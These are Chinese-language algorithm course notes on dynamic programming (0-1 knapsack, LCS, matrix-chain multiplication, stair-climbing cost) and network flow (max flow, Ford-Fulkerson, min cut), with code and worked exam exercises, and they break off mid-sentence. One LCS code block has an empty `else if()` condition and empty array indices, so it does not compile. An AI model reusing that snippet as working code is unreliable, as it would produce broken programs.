理解0-1背包问题的动态规划算法不是多项式时间算法。\n\nP 是否等于 NP 是计算复杂度理论里面最著名的未解决的问题之一，一个 NP 完全问题，如果能找到解决它的多项式时间算法，那么就说明了 P = NP。\n\n如今 0-1 背包问题已经被证明是 NP 完全问题，而它却有着一个动态规划解法，该解法有着 O(n*W) 的时间复杂度，其中 n 是物品的个数，W 是背包限制的最大负重。所以时间复杂度对输入 n，W 来说是多项式时间的，所以说明了 NP = P 是不是哪里出错了呢？\n\n其实多项式时间是相对于输入规模来说的，输入规模最直观的理解就是输入到该算法的数据占了多少比特内存。0-1 背包的输入有 n 个物品的价值，n 个物品的重量，还有背包的最大负重 W。如今假设 W 占用的比特数为 L（也就是说背包的最大负重的输入规模是 L），那么 log(W) = L，所以 O(n\\*W) = O(n*2<sup>L</sup>)，由此看到，该算法的时间复杂度对于输入规模 L 来说是指数级别的，随着输入规模 L 的增加，运算时间会迅速增长。\n\n实际上，人们把这种动态规划的算法称为伪多项式时间算法（pseudo-polynomial time algorithm），这种算法不能真正意义上实现多项式时间内解决问题。\n\n#### ➃真题练习\n\n##### 题目1\n\n![](https://img.jwt1399.top/img/image-20211104201447553.png)\n\n![](https://img.jwt1399.top/img/image-20211210165447955.png)\n\n##### 题目2\n\n![](https://img.jwt1399.top/img/image-20211104223426667.png)\n\n### ❹最长公共子序列\n\n> **问题描述︰**给定两个字符串，求解这两个字符串的最长公共子序列(LCS)。如: X={1,5,2,8,9,3,6},Y={5,6,8,9,3,7}，其最长公共子序列为{5,8,9,3}，最长公共子序列长度为4。那么如何求解呢？\n\n#### ➀理论分析\n\n**1、分析最优子结构**\n\n设序列 **X={x<sub>1</sub>, x<sub>2</sub>, …, x<sub>i</sub>}** 和 **Y={y<sub>1</sub>, y<sub>2</sub>, …, y<sub>j</sub>}** 的最长公共子序列为 **Z={z<sub>1</sub>, z<sub>2</sub>, …, z<sub>k</sub>}**，则\n\n- ①若 **x<sub>i</sub>=y<sub>j</sub>** ，则 z<sub>k</sub>=x<sub>i</sub>=y<sub>j</sub> 且 **Z<sub>k-1</sub>** 是 X<sub>i-1</sub> 和 Y<sub>j-1 </sub>的最长公共子序列;\n\n- ②若 **x<sub>i</sub>≠y<sub>j</sub>** 且 **z<sub>k</sub>≠x<sub>i</sub>** ，则 **Z<sub>k</sub>** 是 X<sub>i-1 </sub>和 Y<sub>j</sub> 的最长公共子序列;.\n\n- ③若 **x<sub>i</sub>≠y<sub>j</sub>** 且 **z<sub>k</sub>≠y<sub>j</sub>** ，则 **Z<sub>k </sub>**是 X<sub>i</sub> 和 Y<sub>j-1 </sub>的最长公共子序列。\n\n**2、建立递推公式**\n\n用**`c[i][j]`**表示 **X<sub>i</sub>={x<sub>1</sub>, x<sub>2</sub>, …, x<sub>i</sub>}** 和 **Y<sub>j</sub>={y<sub>1</sub>, y<sub>2</sub>, …, y<sub>j</sub>}** 的最长公共子序列的长度，那么得到以下的递推公式：\n\n![](https://img.jwt1399.top//img/20211010182558.png)\n\n**递推公式代码版**：\n\n```c\nfor(int i = 0; i <= n; i++){\n\t\tfor(int j = 0; j <= m; j++){\n\t\t\tc[i][0] = 0;\n\t\t\tc[0][j] = 0;\n\t\t}\n    }\nfor(int i = 1; i <= n; i++)\n    for(int j = 1; j <= m; j++){\n        if(X[i] == Y[j]){\n            c[i][j] = c[i-1][j-1] + 1;\n        }\n        else{\n            c[i][j] = max(c[i - 1][j], c[i][j - 1]);\n        } \t\n    }\n```\n\n**3、计算`最优值`**\n\n> 假设 X={A,B,C,E} 和 Y={B,D,C,E}\n\n根据上方递推公式得到下表：\n\n| `c[i][j]` | 0    | 1B   | 2D   | 3C   | 4E   |\n| --------- | ---- | ---- | ---- | ---- | ---- |\n| **0**     | 0    | 0    | 0    | 0    | 0    |\n| **1A**    | 0    | 0    | 0    | 0    | 0    |\n| **2B**    | 0    | 1    | 1    | 1    | 1    |\n| **3C**    | 0    | 1    | 1    | 2    | 2    |\n| **4E**    | 0    | 1    | 1    | 2    | `3`  |\n\n在 `C[2][0]` 处，j = 0 ，此时根据公式`C[2][0]= 0`\n\n在 `C[2][1]` 处，B = B，即 **x<sub>i</sub>=y<sub>j</sub>** ，此时根据公式`C[2][1]=C[1][0]+1=0+1=1`\n\n在 `C[2][2]` 处，B ≠ C，即 **x<sub>i</sub>≠y<sub>j</sub>** ，此时根据公式`C[2][2]=max{C[2][1],C[1][2]}=1`\n\n根据最**右下角的值(c[][])**，我们可以知道**最长公共子序列长度为3**。\n\n**最优值代码版：**\n\n```c\nint LCSLength(char *X,char *Y)\n{\n\tfor(int i = 0; i <= n; i++){\n\t\tfor(int j = 0; j <= m; j++){\n\t\t\tc[i][0] = 0;\n\t\t\tc[0][j] = 0;\n\t\t}\n    }\n\tfor(int i = 1; i <= n; i++)\n\t\tfor(int j = 1; j <= m; j++){\n\t\t\tif(X[i] == Y[j]){\n\t\t\t\tc[i][j] = c[i-1][j-1] + 1;\n\t\t\t}\n\t\t\telse{\n\t\t\t\tc[i][j] = max(c[i - 1][j], c[i][j - 1]);\n\t\t\t} \t\n\t\t}\n     return c[n][m];\n}\n```\n\n**4、构造`最优解`**\n\n`b[i][j]`记录`c[i][j]`的值是由哪个子问题的解得到的\n\n- `if(X[i]==Y[j])` 用b=1代表\n\n- `if(X[i]!=Y[j])` 用b=2代表\n\n| `b[i][j]` | 0    | 1B   | 2D   | 3C   | 4E   |\n| --------- | ---- | ---- | ---- | ---- | ---- |\n| **0**     | 0    | 0    | 0    | 0    | 0    |\n| **1A**    | 0    | 2    | 2    | 2    | 2    |\n| **2B**    | 0    | 1    | 2    | 2    | 2    |\n| **3C**    | 0    | 2    | 2    | 1    | 2    |\n| **4E**    | 0    | 2    | 2    | 2    | 1    |\n\n\n\n| `c[i][j]` | 0    | 1B   | 2D   | 3C   | 4E   |\n| --------- | ---- | ---- | ---- | ---- | ---- |\n| **0**     | 0    | 0    | 0    | 0    | 0    |\n| **1A**    | 0    | 0    | 0    | 0    | 0    |\n| **2B**    | 0    | 1`↖` | 1`←` | 1    | 1    |\n| **3C**    | 0    | 1    | 1    | 2`↖` | 2    |\n| **4E**    | 0    | 1    | 1    | 2    | 3`↖` |\n\n`↖`处则为最长公共子序列{B,C,E}\n\n#### ➁代码实现\n\n```c\n//自底向上计算最优值，并记录相关信息\nvoid LCSLength(){\n\tint i,j;\n\tfor(i=1; i<=m; i++){\n\t\tc[i][0] = 0;\n\t}\n\tfor(i=1; i<=n;i++){\n\t\tc[0][i] = 0;\n\t}\n\tfor(i=1; i<=m; i++){\n\t\tfor(j=1; j<=n; j++){\n\t\t\tif(x[i] == y[j]){\n\t\t\t\tc[i][j] = c[i-1][j-1] + 1;\n\t\t\t\tb[i][j] = 1;\n\t\t\t}else if(){\n\t\t\t\tc[i][j] = c[i-1][j];\n\t\t\t\tb[i][j] = 3;\n\t\t\t}else{\n\t\t\t\tc[i][j] = c[i][j-1];\n\t\t\t\tb[i][j] = 2;\n\t\t\t}\n\t\t}\n\t}\n}\nvoid LCS(int i,int j,char *x,int **b){\n\tif(i == 0 || j == 0){\n\t\treturn;\n\t}\n\tif(b[i][j] == 1){\n\t\tLCS(i-1,j-1,x,b);\n\t\tcout<<x[i];\n\t}else if(b[][] == 2){\n\t\tLCS(i,j-1,x,b);\n\t}else{\n\t\tLCS(i-1,j,x,b);\n\t}\n}\n```\n\n#### ➂真题练习\n\n##### 题目1\n\n给定两个字符串A和B，长度分别为m和n，设计动态规划算法找出它们最长公共子序列长度，并给出最长公共子序列。例如：A = \"HelloWorld\"，B = \"loopbird\"，则A与B的最长公共子序列为\"loord\"，返回的长度为5。\n\n\n\n##### 题目2\n\n设计一个 O(n<sup>2</sup>) 时间的算法，找出由 n 个数组成的序列的最长单调递增子序列(LIS)。\n\n解法一：转化成 LCS 问题求解，时间复杂度为 O(n*n).\n\n思路：原序列为 A，把 A 按升序排序得到序列 B，求出 A，B 序列的最长公共子序列，即为 A 的最长单调递增子序列。\n\n解法二：设 d[i] 为以第 i 个元素结尾的最长递增子序列的长度，\n\n则 d(i) = max(d(j)) + 1; ( j<i && a[j] < a[i] ) ,  时间复杂度O(n*n)\n\n### ❺矩阵连乘\n\n##### ➀理论分析\n\n> **问题描述：**给定 n 个矩阵 {A<sub>1</sub>,A<sub>2</sub>,…,A<sub>n</sub>} ，其中 A<sub>i</sub> 与 A<sub>i+1</sub> 是可乘的，用加括号的方法表示矩阵连乘的次序，不同加括号的方法所对应的计算次序是不同的，求矩阵连乘的最佳计算次序。\n>\n> 例如，矩阵连乘积 A<sub>1</sub>A<sub>2</sub>A<sub>3</sub> 有以下 2 种加括号方式：A<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>)，(A<sub>1</sub>A<sub>2</sub>)A<sub>3</sub>，所以那种加括号方式是最优的呢？\n>\n> 说明：\n>\n> - 1.矩阵 A 和矩阵 B 可乘的条件：`矩阵 A 的列数 = 矩阵 B 的行数`\n> - 2.设矩阵 A 是 p × q 的矩阵，B 是 q × r 的矩阵，`乘积结果 C 是 p × r的矩阵，计算量是 p * q * r`\n\n**1、分析最优子结构**\n\n将矩阵连乘的积 **A<sub>i</sub> A<sub>i+1</sub> … A<sub>j</sub>** 简记为`A[i][j]` ，**A<sub>i</sub>** 的维度记为 **p<sub>i-1 </sub>× p<sub>i</sub>**，那么上述问题变为求解 `A[1][n]`的最佳计算次序。\n\n`A[1][n]的最佳计算次序：`设这个计算次序在矩阵  A<sub>K </sub> (1≤k<n) 和 A<sub>K+1</sub> 之间将矩阵链断开，则相应的加括号方式：( **A<sub>i</sub> A<sub>i+1</sub> … A<sub>k</sub>** )( **A<sub>k+1</sub>A<sub>i+1</sub> … A<sub>n</sub>** )，依此计算顺序，总计算量为 **A<sub>i</sub> A<sub>i+1</sub> … A<sub>k</sub>** 的计算量加上 **A<sub>k+1</sub>A<sub>i+1</sub> … A<sub>n</sub>** 的计算量，再加上 ( **A<sub>i</sub> A<sub>i+1</sub> … A<sub>k</sub>** ) 和  ( **A<sub>k+1</sub>A<sub>i+1</sub> … A<sub>n</sub>** )相乘的计算量。即 **A[1]\\[n] = A[1]\\[k] + A[k+1]\\[n] + p<sub>i-1</sub>p<sub>k</sub>p<sub>n</sub>** \n\n**2、建立递推公式**\n\n设计算 `A[i][j]` (i≤j) 所需的最少乘法次数为 `m[i][j]`，那么得到以下的递推公式：\n\n![](https://img.jwt1399.top//img/20211011125331.png)\n\n**3、计算`最优值`**\n\n例如，要计算矩阵连乘积A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>A<sub>6</sub>，其中各矩阵的维数分别为:\n\n| A1    | A2    | A3   | A4   | A5    | A6    |\n| ----- | ----- | ---- | ---- | ----- | ----- |\n| 30x35 | 35x15 | 15x5 | 5x10 | 10x20 | 20x25 |\n\n依据递推公式，按照图 a 的次序，计算出  `m[i][j]`\n\n![](https://img.jwt1399.top/img/image-20211011130742451.png)\n\n![](https://img.jwt1399.top//img/20211011131609.png)\n\n★最优值：本题是求解 `A[1][6]` 的最佳计算次序，即求`m[1][6]` 。由图 b 可知， `m[1][6] =15125`，因此矩阵连乘积A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>A<sub>6</sub> 的最优值为 **15125**\n\n**4、构造`最优解`**\n\n若将对应`m[i][j]`的断开位置`k`记为`s[i][j]`，计算出最优值`m[i][j]`后，可递归地由`s[i][j]`[][]构造出相应的最优解。\n\n![](https://img.jwt1399.top//img/20211011131648.png)\n\n例如，**m[2]\\[5] = m[2]\\[3] + m[4]\\[5] + p<sub>1</sub>p<sub>3</sub>p<sub>5</sub>** ，则 k = 3，因此 **s[2]\\[5] = 3**\n\n★最优解：\n\ns[1]\\[6] = 3 ,因此矩阵链在A<sub>3</sub>和A<sub>4</sub>之间断开，则加括号方式为 **(A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>)(A<sub>4</sub>A<sub>5</sub>A<sub>6</sub> )**\n\ns[1]\\[3] = 1,因此矩阵链在A<sub>1</sub>和A<sub>2</sub>之间断开，则加括号方式为 **(A<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>))(A<sub>4</sub>A<sub>5</sub>A<sub>6</sub> )**\n\ns[4]\\[6] = 5,因此矩阵链在A<sub>5</sub>和A<sub>6</sub>之间断开，则加括号方式为 **(A<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>))((A<sub>4</sub>A<sub>5</sub>)A<sub>6</sub> )**\n\n因此最优解为 **(A<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>))((A<sub>4</sub>A<sub>5</sub>)A<sub>6</sub> )**\n\n##### ➁代码实现\n\n```c\n#include <iostream>\nusing namespace std;\n#define N 100\nint s[N][N], m[N][N];  //s存储切割位置，m存储最优值 \n\nvoid MatricChain(int *p , int n) {//p矩阵维数数组，n为矩阵个数\n\tfor (int i = 1; i <= n; i++) {//初始化，对角线上的计算量和加括号的位置为0\n\t\tm[i][i] = 0;\n\t\ts[i][i] = 0;\n\t}\n\tfor (int r = 2; r <= n; r++) {//r为矩阵链的长度\n\t\tfor (int i = 1; i <= n - r + 1; i++) { //i为首矩阵的序号\n\t\t\tint j = i + r - 1; //j为尾矩阵的序号\n\t\t\tm[i][j] = m[i][i] + m[i + 1][j] + p[i - 1] * p[i] * p[j];//首先尝试在矩阵 i 处分开\n\t\t\ts[i][j] = i;\n\t\t\tfor (int k = i + 1; k < j; k++) {  \n\t\t\t\t\tint t = m[i][k] + m[k + 1][j] + p[i - 1] * p[k] * p[j]; // 然后尝试在矩阵 k 处分开 (i<=k<j)\n\t\t\t\t\tif (t < m[i][j]) {\n\t\t\t\t\t\tm[i][j] = t;\n\t\t\t\t\t\ts[i][j] = k;\n\t\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\nvoid Traceback(int i, int j) {\n\tif (i == j) {\n\t\treturn;\n\t}\n\tint k = s[i][j];\n\tTraceback(i, k); \n\tTraceback(k + 1, j);\n\tcout << \"A\" << \"[\" << i << \":\" << k << \"]\" << \"×\" << \"A\"\"[\" << (k + 1) << \":\" << j << \"]\"<<\"  \" ;\n}\n\nint main(){\n\tint p[] = {30,35,15,5,10,20,25};//矩阵维数\n\tint n = sizeof(p) / sizeof(int) - 1;//矩阵个数\n\n\tfor(int i = 0; i < n; i++){\n\t\tcout << p[i]<<\"×\"<<p[i+1]<<\"  \";\n\t}\n\tcout << \"这\" << n << \"个矩阵连乘的最优值和最优解？\" << endl;\n\tcout << endl;\n\n\tMatricChain(p,n);\n\tcout << \"m[i][j]:\" << endl;\n\tfor (int i = 1; i <= n; i++) {\n\t\tfor (int j = 1; j <= n; j++)\n\t\t\tcout << m[i][j] << \"\\t\";\n\t\tcout << endl;\n\t}\n\n\tcout << endl;\n\tcout << \"s[i][j]:\" << endl;\n\tfor (int i = 1; i <= n; i++) {\n\t\tfor (int j = 1; j <= n; j++)\n\t\t\tcout << s[i][j] << \"\\t\";\n\t\tcout << endl;\n\t}\n\tcout << endl;\n\tcout << \"最少连乘次数(最优值):\" << m[1][n] << \"次。\" << endl;\n\tcout << \"最佳计算次序(最优解):\" ;\n\tTraceback(1, n);\n\tcout << endl;\n}\n```\n\n\n\n![](https://img.jwt1399.top//img/20211011231627.png)\n\n##### ➂真题练习\n\n###### 题目1\n\n![](https://img.jwt1399.top//img/20211011201113.png)\n\n（1）令计算**A<sub>1</sub> x A<sub>2</sub> x A<sub>3</sub> x ... x A<sub>n</sub>**所需要的最少乘法次数为*m*[*i*, *j*] （3分）\n\n​\t\t\t则递归关系式为![](https://img.jwt1399.top//img/20211011201529.png)  （5分，其中边界条件1分)\n\n （2）\n\n| m(*i*, *j*) | *j* = 1 | *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ----------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1     | 0       | 1440    | 3360    | 4000    | `5856`  |\n| *i* = 2     | /       | 0       | 2400    | 2800    | 4800    |\n| *i* = 3     | /       | /       | 0       | 1600    | 2880    |\n| *i* = 4     | /       | /       | /       | 0       | 3200    |\n| *i* = 5     | /       | /       | /       | /       | 0       |\n\n 将对应`m(i,j)`的断开位置`k`记为`s(i,j)`\n\n| *s*(*i*, *j*) | *j* = 1 | *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ------------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1       | /       | 1       | 2       | 2       | `2`     |\n| *i* = 2       | /       | /       | 2       | 2       | 2       |\n| *i* = 3       | /       | /       | /       | 3       | `4`     |\n| *i* = 4       | /       | /       | /       | /       | 4       |\n| *i* = 5       | /       | /       | /       | /       | /       |\n\n s(1,5) = 2 因此矩阵链在A<sub>2</sub>和A<sub>3</sub>之间断开，则加括号方式为 **(A<sub>1</sub>A<sub>2</sub>)(A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>)**\n\ns(3,5) = 4 因此矩阵链在A<sub>4</sub>和A<sub>5</sub>之间断开，则加括号方式为 **(A<sub>1</sub>A<sub>2</sub>)((A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>)**\n\n最优加括号方式为![](https://img.jwt1399.top//img/20211011202017.png)\n\n###### 题目2\n\n| **A1** | **A2** | **A3** | **A4** | **A5** |\n| ------ | ------ | ------ | ------ | ------ |\n| 3x7    | 7x8    | 8x5    | 5x12   | 12x10  |\n\n计算矩阵连乘积A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>最优值和最优解？\n\n| m[i]\\[j] | **1** | **2** | **3** | **4** | **5** |\n| -------- | ----- | ----- | ----- | ----- | ----- |\n| **1**    | 0     | 168   | 288   | 468   | `828` |\n| **2**    |       | 0     | 280   | 700   | 1230  |\n| **3**    |       |       | 0     | 480   | 1000  |\n| **4**    |       |       |       | 0     | 600   |\n| **5**    |       |       |       |       | 0     |\n\n| s[i]\\[j] | **1** | **2** | **3** | **4** | **5** |\n| -------- | ----- | ----- | ----- | ----- | ----- |\n| **1**    | 0     | 1     | `2`   | `3`   | `4`   |\n| **2**    |       | 0     | 2     | 3     | 3     |\n| **3**    |       |       | 0     | 3     | 3     |\n| **4**    |       |       |       | 0     | 4     |\n| **5**    |       |       |       |       | 0     |\n\n最少乘法次数为(最优值)：**828**\n\ns[1]\\[5] = 4 因此矩阵链在A<sub>4</sub>和A<sub>5</sub>之间断开，则加括号方式为 **(A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>**\n\ns[1]\\[4] = 3 因此矩阵链在A<sub>3</sub>和A<sub>4</sub>之间断开，则加括号方式为 **((A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>)A<sub>4</sub>)A<sub>5</sub>**\n\ns[1]\\[3] = 2 因此矩阵链在A<sub>2</sub>和A<sub>3</sub>之间断开，则加括号方式为 **(((A<sub>1</sub>A<sub>2</sub>)A<sub>3</sub>)A<sub>4</sub>)A<sub>5</sub>**\n\n最优加括号方式为(最优解)： **(((A<sub>1</sub>A<sub>2</sub>)A<sub>3</sub>)A<sub>4</sub>)A<sub>5</sub>**\n\n### ❻真题练习\n\n#### 题目1\n\n**题目：**LC746. 使用最小花费爬楼梯\n\n数组的每个下标作为一个阶梯，第 i 个阶梯对应着一个非负数的体力花费值 cost[i]（下标从 0 开始）。每当你爬上一个阶梯你都要花费对应的体力值，一旦支付了相应的体力值，你就可以选择向上爬一个阶梯或者爬两个阶梯。请你找出达到楼层顶部的最低花费。在开始时，你可以选择从下标为 0 或 1 的元素作为初始阶梯。\n\n示例 1：\n\n```properties\n输入：cost = [10, 15, 20]\n输出：15\n解释：最低花费是从 cost[1] 开始，然后走两步即可到阶梯顶，一共花费 15 。\n 示例 2：\n\n输入：cost = [1, 100, 1, 1, 1, 100, 1, 1, 100, 1]\n输出：6\n解释：最低花费方式是从 cost[0] 开始，逐个经过那些 1 ，跳过 cost[3] ，一共花费 6 。\n```\n\n**思路**\n\n创建长度为 n + 1 的数组 dp，其中 dp[i] 表示达到下标 i 的最小花费。\n\n由于可以选择下标 0 或 1 作为初始阶梯，因此有 dp[0] = dp[1] = 0\n\n当 2 ≤ i ≤ n 时，可以从下标 i−1 使用 cost[i−1] 的花费达到下标 i，或者从下标 i−2 \n\n使用 cost[i−2] 的花费达到下标 i。为了使总花费最小，dp[i] 应取上述两项的最小\n\n值，因此状态转移方程如下：\n\n**dp[i]=min(dp[i−1]+cost[i−1],dp[i−2]+cost[i−2])**\n\n依次计算 dp 中的每一项的值，最终得到的 dp[n] 即为达到楼层顶部的最小花费。\n\n解答\n\n```java\nclass Solution {\n    public int minCostClimbingStairs(int[] cost) {\n        int n = cost.length;\n        int[] dp = new int[n + 1];\n        dp[0] = dp[1] = 0;\n        for (int i = 2; i <= n; i++) {\n            dp[i] = Math.min(dp[i - 1] + cost[i - 1], dp[i - 2] + cost[i - 2]);\n        }\n        return dp[n];\n    }\n}\n```\n\n#### 题目2\n\n![](https://img.jwt1399.top/img/image-20211210154118892.png)\n\n![](https://img.jwt1399.top/img/image-20211210154157032.png)\n\n![](https://img.jwt1399.top/img/image-20211210154316100.png)\n\n##  ⑥网络流\n\n> **本章重点：**\n>\n> - 理解最大流、任意流、最小割、任意割之间的关系；\n>\n> - 掌握网络最大流问题和最小割问题及其求解算法，给出一个网络能求出它的最大流或者最小割。\n\n### ❶基础概念\n\n**网络流(Network-Flows)**是一种类比`水流`的解决问题方法，与线性规划密切相关。网络流是图论中的一种理论与方法，研究网络上的一类最优化问题。\n\n**网络(NetWork)：**是指一个有向图 G =(V,E)，V 是图 G 中顶点的集合，E 是图 G 中边的集合。（**运输水流的水管线路**）\n\n- 每条`边 (u,v)` ∈ E 都有一个`权值 c(u,v)` ，称之为`容量(Capacity)`，当 (u,v) ∉ E 时 c(u,v) = 0。\n\n- 图 G 有两个特殊的点：`源点 s` ∈ V 和`汇点 t` ∈ V 。\n\n**弧** (arc) **：** 图 G 的边 `(u,v)`（**水管**）\n\n**源点** (Sources)： 可以理解为**起点**。它会源源不断地放出流量，表示为 `s` 。（**可无限出水的水厂**）\n\n**汇点** (Sinks)：可以理解为**终点**。它会无限地接受流量，表示为 `t` 。（**可无限接收水的小区**）\n\n**容量** (Capacity) **：**每条弧 (u,v) 的权值 `c(u,v)` （**水管规格。即可承受的最大水流量**）\n\n**容量网络：** 拥有**源点**和**汇点**且每条弧都给出了**容量**的**网络**。（**安排好了水厂、小区和水管规格的路线图**）\n\n![容量网络](https://img.jwt1399.top//img/20211016110427.png)\n\n\n\n**流量** (Flow) **：**容量网络G中每条弧< u,v>上的实际流量 ，表示为 `f(u,v)` （**运输的水流量**）\n\n​\t设 `f(u,v)`定义在二元组 (u∈V, v∈V) 上的实数函数满足：\n\n- 容量限制：对于每条边，流经该边的流量不超过该边的容量，即 f(u,v)≤c(u,v) (**水流量超过了水管规格就爆了**）\n\n- 斜对称性：每条边的流量与其相反边的流量之和为 0 ，即 f(u,v)+f(v,u)=0 (**可以暂且感性理解为矢量的正负**)\n\n- 流守恒性：从源点流出的流量等于汇点流入的流量。即 ∀x ∈ V - {s,t}，∑<sub>(u,x)∈E</sub>f(u,x) = ∑<sub>(x,v)∈E</sub>f(x,v) (**对于所有的水管交界处，有多少水流量过来，就应有多少水流量出去**)\n\n![流函数](https://img.jwt1399.top//img/20211016110621.png)\n\n**流量网络：** 拥有**源点**和**汇点**且每条弧都给出了**流量**的**网络**。(**分配好了各个水管水流量的路线图**)\n\n![流量网络](https://img.jwt1399.top//img/20211016110431.png)\n\n\n\n**剩余容量**(Residual)：对于每条边，`剩余容量(Residual) = 容量(Capacity) − 流量(Flow)`。(**表示水管分配了水流量后还能继续承受的水流量**）\n\n**残量网络：** 拥有**源点**和汇点且每条弧还有**剩余容量**的**网络**。`残量网络 = 容量网络 − 流量网络`。初始的残量网络即为容量网络。（**表示了分配了一定的水流量后还能继续承受的水流量路线图**）\n\n![剩余网络](https://img.jwt1399.top//img/20211016111631.png)\n\n\n\n### ❷最大流\n\n> **问题描述：**我们有一张有向图，要求从源点 s 流向汇点 t 的最大流量（可以有很多条路到达汇点），这就是我们的最大流问题。\n\n#### ➀基础概念\n\n**网络的流量：** 在某种方案下形成的**流量网络**中**汇点**接收到的**流量**值。（**小区最终接收到的总水流量**）\n\n**最大流(Maximum-Flow)** ：**网络的流量**的最大值。（**小区可接受到的最大水流量**）\n\n**最大流网络：** 达到**最大流**的**流量网络**。（**小区接收到最大水流量的分配方案路线图**）\n\n**增广路径(Augmenting Path)：** 一条在**残量网络**中从 s 到 t 的路径，路径上所有边的**残留容量**都为正。\n(**可以成功从水厂将水送到小区的一条路线**）\n\n#### ➁增广路算法\n\n> 当残量网络不包含增广路径时能求得最大流\n\n例如如下网络：\n\n| 初始容量网络                                         | 初始残量网络                                         |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20211016110427.png) | ![](https://img.jwt1399.top//img/20211016132829.png) |\n\n**寻找增广路径**,增广路径上的流量为路径上最小容量\n\n| 增广路径1（s→v<sub>2</sub>→v<sub>4</sub>→t）                 | 残量网络1                                            |\n| ------------------------------------------------------------ | ---------------------------------------------------- |\n| ![s→v2→v4→t](https://img.jwt1399.top//img/20211016132837.png) | ![](https://img.jwt1399.top//img/20211016132841.png) |\n| **增广路径2（s→v<sub>1</sub>→v<sub>3</sub>→t）**             | **残量网络2**                                        |\n| ![s→v1→v3→t](https://img.jwt1399.top//img/20211016132845.png) | ![](https://img.jwt1399.top//img/20211016132848.png) |\n| **增广路径3（s→v<sub>1</sub>→v<sub>4</sub>→t）**             | **最终残量网络**                                     |\n| ![](https://img.jwt1399.top//img/20211016132853.png)         | ![](https://img.jwt1399.top//img/20211016132856.png) |\n\n**求流量网络**，流量网络 = 初始容量网络 - 最终残余网络\n\n![流量网络](https://img.jwt1399.top//img/20211016132910.png)\n\n**因此最大流为从 s 流出的流量 3 + 2 = 5 或者流入 t 的流量 2 +3 =5**\n\n**但是这种算法并不能保证一定能得到最大流**，取决于你选择增广路径的顺序，我们同样以上方初始容量网络图为例，假设第一条增广路径选择 **s→v<sub>1</sub>→v<sub>4</sub>→t**，第二条增广路径选择 **s→v<sub>1</sub>→v<sub>3</sub>→t**，得到如下残量网络 和 流量网络\n\n| 容量网络                                             | 残量网络                                             | 流量网络                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20211016110427.png) | ![](https://img.jwt1399.top//img/20211016133136.png) | ![](https://img.jwt1399.top//img/20211016133139.png) |\n\n**因此该种方法求得最大流为从 s 流出的流量 4 + 0 = 4 或者流入 t 的流量 1 +3 =4**，显然比刚刚求得的最大流 5 要小\n\n`总结：`这种算法并不能保证一定能得到最大流，取决于你选择增广路径的顺序，那么如何保证无论怎么选择增广路径仍然能求得最大流呢？且听我娓娓道来。\n\n#### ➂Ford-Fulkerson\n\nFF 算法核心是引入反向边，有了反向边，哪怕之前选择的增广路径顺序不好，也有了一个后悔和改正的机会\n\nFF算法复杂度：O(f*m) (f 为最大流，m为原图边的数量)\n\n我们来改造上方的错误求解方法\n\n| 增广路径1(s→v<sub>1</sub>→v<sub>4</sub>→t)                   | 残量网络1                                            | 加入路径1反向边                                              |\n| ------------------------------------------------------------ | ---------------------------------------------------- | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top//img/20211016141358.png)         | ![](https://img.jwt1399.top//img/20211016141425.png) | ![](https://img.jwt1399.top//img/20211016141433.png)         |\n| **增广路径2(s→v<sub>1</sub>→v<sub>3</sub>→t)**               | **残量网络2**                                        | **加入路径2反向边**                                          |\n| ![](https://img.jwt1399.top//img/20211016141347.png)         | ![](https://img.jwt1399.top//img/20211016141416.png) | ![](https://img.jwt1399.top//img/20211016141442.png)         |\n| **增广路径3(s→v<sub>2</sub>→v<sub>4</sub>→v<sub>1</sub>→v<sub>3</sub>→t)** | **残量网络3**                                        | **加入路径3反向边**                                          |\n| ![相当于反悔v4→v1的3份流量](https://img.jwt1399.top//img/20211016141457.png) | ![](https://img.jwt1399.top//img/20211016141459.png) | ![已经没有s到t的增广路径](https://img.jwt1399.top//img/20211016141503.png) |\n| **移除所有反向边得最终残量图**                               | **流量图**                                           | **最大流**                                                   |\n| ![](https://img.jwt1399.top//img/20211016141512.png)         | ![](https://img.jwt1399.top//img/20211016141517.png) | **因此最大流为从 s 流出的流量4 + 1 = 5 或者流入 t 的流量 2 +3 =5** |\n\n### ❸最小割\n\n**割**：对于一个网络流图 G = (V,E)，其割的定义为一种 **点的划分方式**：将所有的点 V 划分为 S 和 T 两个集合，其中源点  s ∈ S ，汇点 t ∈ T。割并不唯一\n\n![](https://img.jwt1399.top/img/202211082244581.png)\n\n`上图就为一种割，S = {s,v1,v2}，V ={t,v3,v4},s的水无法流到t了`\n\n**割的容量**：我们的定义割 (S,T) 的容量 c(S,T) 表示所有从 S 到 T 的边的容量之和，即 c(S,T) = ∑<sub>u∈S,v∈T</sub>c(u,v) 。\n\n![](https://img.jwt1399.top//img/20211021151950.png)\n\n`容量 c(S,T) = 2 + 2 + 2 = 6`\n\n![](https://img.jwt1399.top//img/20211021151945.png)\n\n`容量 c(S,T) = 2 + 1 = 3`\n\n**最小割：**求得一个割 (S,T) 使得割的容量 c(S,T) 最小，最小割并不一定唯一。\n\n**最大流最小割定理**：f(s,t)<sub>max</sub> = c(S,T)<sub>min</sub> 最小割的容量等价于最大流的流量\n\n**求解最小割：** \n\n- **求最小割的容量**，那么只要跑一遍网络最大流即可得出答案。\n\n- **求 S 集合和 T 集合**，那么先跑一遍网络最大流，然后在跑完网络最大流的残留网络中，从源点 s 开始进行 